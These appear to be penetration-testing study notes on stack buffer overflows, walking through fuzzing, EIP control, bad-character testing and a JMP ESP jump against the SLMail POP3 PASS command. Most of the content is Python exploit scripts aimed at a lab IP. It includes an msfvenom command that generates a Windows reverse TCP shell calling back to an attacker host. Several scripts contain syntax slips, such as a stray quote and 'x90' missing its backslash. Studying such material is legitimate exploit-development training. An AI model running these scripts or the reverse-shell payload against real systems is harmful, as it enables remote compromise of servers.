# Buffer Overflows
* Stack

## Vulnerable Code

vuln.c
```c
#include <stdio.h>

int main(int argc, char *argv[])

{
  char buffer[64];

  if (argc < 2)
  {
    printf("syntax error\r\n");
    printf("must supply at least one argument\r\n")
    return(1);
  }
  strcpy(buffer,argv[1]);
  return(0);
}
```


* Supply more than 64 bytes and this crashes

Registers to remember
* ESP - Extended Stack Pointer
  * push and pop values
* EIP - Extended Instruction Pointer
  * holds the current address location for the instruction being executed at any given time

### OllyDbg Layout

Bottom right - shows stack memory at any given moment

Bottom left - Allows us to see memory dumps

Look for where main function begins


## Windows BO Example

3 ways to identify bugs:

1. look at source code
2. identify input points and send malformed data known as fuzzing
3. reverse engineering techniques

### Fuzzing

pop3-pass-fuzz.py

```python
#!/usr/bin/python
import socket

# Create an array of buffers, while incrementing them.

buffer=["A"]
counter=100
while len(buffer) <=30:
  buffer.append("A"*counter)
  counter=counter+200

# Each one of these buffers is a password with varying lengths
for string in buffer:
  print "Fuzzing PASS with %s bytes" % len(string)
  s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  connect=s.connect(('192.168.30.35',110))
  s.recv(1024)
  s.send('USER test\r\n'')
  s.recv(1024)
  s.send('PASS ' + string + '\r\n')
  s.send('QUIT\r\n')
  s.close()

```

### Crash Replication

About 2700 bytes causes overflow for SLMail

slmail-pop3.py

```python
#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buffer = A * 2700

try:
  print "\nSending evil buffer..."
  s.connect(('192.168.30.35',110))
  data = s.recv(1024)
  s.send('USER username' + '\r\n')
  data = s.recv(1024)
  s.send('PASS ' + buffer + '\r\n')
  print "\nDone!."
except:
  print "Could not connect to POP3!"
```

### Controlling EIP

Send a unique string of 2700 bytes then note the 4 bytes that overwrite the EIP

Helpful tool to create unique string
`pattern_create.rb 2700`

then swap out the AAAAs with a unique string

```python
#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buffer = UNIQUE_STRING

try:
  print "\nSending evil buffer..."
  s.connect(('192.168.30.35',110))
  data = s.recv(1024)
  s.send('USER username' + '\r\n')
  data = s.recv(1024)
  s.send('PASS ' + buffer + '\r\n')
  print "\nDone!."
except:
  print "Could not connect to POP3!"
```

`pattern_offset.rb 39694438`
* will tell offset of 2606

```python
#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buffer = "A" * 2606 + "B" * 4 + "C" * 90

try:
  print "\nSending evil buffer..."
  s.connect(('192.168.30.35',110))
  data = s.recv(1024)
  s.send('USER username' + '\r\n')
  data = s.recv(1024)
  s.send('PASS ' + buffer + '\r\n')
  print "\nDone!."
except:
  print "Could not connect to POP3!"
```

### Introducing Shellcode

Look at ESP for where the Cs start

350-450 bytes


```python
#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buffer = "A" * 2606 + "B" * 4 + "C" * (3500-2606-4)


try:
  print "\nSending evil buffer..."
  s.connect(('192.168.30.35',110))
  data = s.recv(1024)
  s.send('USER username' + '\r\n')
  data = s.recv(1024)
  s.send('PASS ' + buffer + '\r\n')
  print "\nDone!."
except:
  print "Could not connect to POP3!"
```

This will increase the space we can use. (424 bytes)

Metasplot has a shellcode generator

### Bad Characters

There may be certain characters that are considered bad and shouldn't be used in shellcode.

* NULL byte opcode - hex 00
  * also used to terminate a string copy operation

* CR return character - hex 0D

* LF line feed - hex 0A

Send 00 - FF to test for bad Characters

```python
#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

badchars = (""\x01\x02\x03...\xff")

#buffer = "A" * 2606 + "B" * 4 + "C" * (3500-2606-4)
buffer = "A" * 2606 + "B" * 4 + badchars

try:
  print "\nSending evil buffer..."
  s.connect(('192.168.30.35',110))
  data = s.recv(1024)
  s.send('USER username' + '\r\n')
  data = s.recv(1024)
  s.send('PASS ' + buffer + '\r\n')
  print "\nDone!."
except:
  print "Could not connect to POP3!"
```

Look at memory location at ESP

* OA causes problem so we remove it

Now we find 00 and 0D causes an issue as well

### Redirecting Execution

Try to get the EIP to point to ESP

JMP ESP

### Introducing the Mona script

* in Immunity Debugger

Criteria
* No memory detections be present
  * ASLR
  * DEP
* Memory range does not contain bad chars

SLMFC.DLL
* need to find a JMP ESP in this DLL

nasm_shell.rb

find opcode with mona

`!mona find -s "\xff\xe4" -m slmfc.dll`


```python
#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


buffer = "A" * 2606 + "\x8f\x35\x4a\x5f" + "C" * (3500-2606-4)


try:
  print "\nSending evil buffer..."
  s.connect(('192.168.30.35',110))
  data = s.recv(1024)
  s.send('USER username' + '\r\n')
  data = s.recv(1024)
  s.send('PASS ' + buffer + '\r\n')
  print "\nDone!."
except:
  print "Could not connect to POP3!"
```

* Place breakpoint at the memory address

* points to the beginning of Cs in buffer

### Shellcode

* shellcode payload generator from metasploit

`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.30.5 LPORT=443 -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai`

* IP is of attacker
* -f c is for C
* -a for x86/x64
* --platform windows
* -e encoder

Copy and put it into exploit

```python
#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

shellcode = ("GENERATED SHELL CODE")

buffer = "A" * 2606 + "\x8f\x35\x4a\x5f" + "x90" * 16 + shellcode + "C" * (3500-2606-4-351-16) # 351 bytes are the size of the payload
# Need to add some NOPs

try:
  print "\nSending evil buffer..."
  s.connect(('192.168.30.35',110))
  data = s.recv(1024)
  s.send('USER username' + '\r\n')
  data = s.recv(1024)
  s.send('PASS ' + buffer + '\r\n')
  print "\nDone!."
except:
  print "Could not connect to POP3!"
```

## Linux BO Example
